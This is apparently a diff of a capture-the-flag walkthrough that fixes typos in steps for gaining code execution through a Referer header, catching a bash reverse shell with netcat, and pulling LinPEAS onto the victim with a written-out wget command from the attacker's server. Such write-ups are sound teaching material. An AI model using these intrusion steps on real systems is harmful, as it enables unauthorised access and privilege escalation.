@@ -56,13 +56,13 @@ Now we can send this to Repeater and see what our Response looks like.
 
 ![image](https://user-images.githubusercontent.com/50459517/102672853-9f916c00-4157-11eb-8718-7d0d33f64950.png)
 
-Now like we saw in the article, lets modify the Referer: header in the Request (In this case we will need to add this header) and see if we get code execution.
+Now like we saw in the article, lets modify the **Referer:** header in the Request (In this case we will need to add this header) and see if we get code execution.
 
 ![image](https://user-images.githubusercontent.com/50459517/102672873-b20ba580-4157-11eb-9fb7-bac5355f3e78.png)
 
 Awesome!  We have code execution!  Lets get that shell now!
 
-We will use just a basic bash one liner to send a request to use on port 1337 and start a netcat listener on our machine that will listen for the request.  Thus resulting in a reverse shell.
+We will use just a basic bash one liner to send a request to out machine on port 1337.  We will start a netcat listener on our machine that will listen for the request.  Thus resulting in a reverse shell.
 
 ![image](https://user-images.githubusercontent.com/50459517/102672900-c6e83900-4157-11eb-819d-59b4a99f4941.png)
 
@@ -72,7 +72,7 @@ Now we have a shell as www-data.  After looking around we find a user named scot
 
 ![image](https://user-images.githubusercontent.com/50459517/102672947-e717f800-4157-11eb-89d5-aa3c19b5d8e5.png)
 
-With that out of the way, I normally like to run some type of post-enumeration script line LinPEAS.  We can just host up the file with **python -m SimpleHTTPServer 80** on our machine and then **wget http://ip/linpeas.sh** onto the victim machine in a directory we have rwx permissions in (i.e. /tmp)
+With that out of the way, I normally like to run some type of post-enumeration script like LinPEAS.  We can just host up the file with **python -m SimpleHTTPServer 80** on our machine and then **wget http://ip/linpeas.sh** onto the victim machine in a directory we have rwx permissions in (i.e. /tmp)
 
 ![image](https://user-images.githubusercontent.com/50459517/102673038-2d6d5700-4158-11eb-9eb9-a0523ab69804.png)
 
